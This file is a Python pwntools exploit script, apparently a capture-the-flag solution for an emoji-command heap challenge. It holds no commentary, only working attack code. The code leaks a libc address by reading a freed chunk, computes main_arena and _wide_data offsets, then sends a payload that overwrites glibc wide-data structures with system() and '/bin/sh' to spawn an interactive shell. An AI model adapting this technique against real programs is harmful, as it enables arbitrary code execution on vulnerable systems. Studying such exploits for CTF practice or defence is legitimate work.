from pwn import * 

PRINT_FLAGS_CMD	= u'\U0001F6A9'
EXIT_CM	= u'\U0001F6D1'
PRINT_EMOJI_CMD	= u'\U0001F4D6'
ADD_EMOJI_CMD = u'\U0001F195'
DELETE_EMOJI_CMD = u'\U0001F193'
END_MSG	= b"\xe2\x9d\x93"

main_arena_offset = 0x3ebca0
wide_data_offset = 0x3eb9e8


def convert_mbstowcs(data):
    c = process('./mbstowcs')
    c.send(data)
    ret = c.recv()
    c.close()
    return ret


def convert_wcstombs(data):
    c = process('./wcstombs')
    c.send(data)
    ret = c.recv()
    c.close()
    return ret.rstrip(b'\x00')


def print_emoji(s, idx):
    s.sendlineafter(END_MSG, PRINT_EMOJI_CMD.encode('utf-8'))
    s.sendline(str(idx))


def add_emoji(s, size, data):
    s.sendafter(END_MSG, ADD_EMOJI_CMD.encode('utf-8'))
    s.send(str(size))
    s.sendline(data)


def delete_emoji(s, index):
    s.sendafter(END_MSG, DELETE_EMOJI_CMD.encode('utf-8'))
    s.send(str(index))


# context.log_level = 'debug'
p = process('./run.sh')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# leak libc address
add_emoji(p, 0x500, 'A')
add_emoji(p, 0x500, 'B')
add_emoji(p, 0x500, 'C')
delete_emoji(p, 2)
print_emoji(p, 2)

for _ in range(5):
    p.recvuntil('\xe2\x9d\x93')

libc_addr = u64(convert_mbstowcs(p.recv(10))[:6] + b'\x00\x00') - main_arena_offset
libc.address = libc_addr
log.info('libc @ ' + hex(libc_addr))
log.info('system @ ' + hex(libc.symbols['system']))

add_emoji(p, 0x500, 'B')
add_emoji(p, 0x500, 'D')
add_emoji(p, 0x500, 'E')

for _ in range(5):
    p.recvuntil('\xe2\x9d\x93')

wide_data_addr = libc_addr + wide_data_offset
log.info('wide_data_1 @ ' + hex(wide_data_addr))

payload = b'\x00'*12
for _ in range(10):
    payload += convert_wcstombs(p64(wide_data_addr)[:4])
    payload += convert_wcstombs(p64(wide_data_addr)[4:])

payload += convert_wcstombs(b'/bin')
payload += convert_wcstombs(b'/sh\x00')
payload += convert_wcstombs(p64(libc.symbols['system'])[:4])
p.send(payload)

p.interactive()
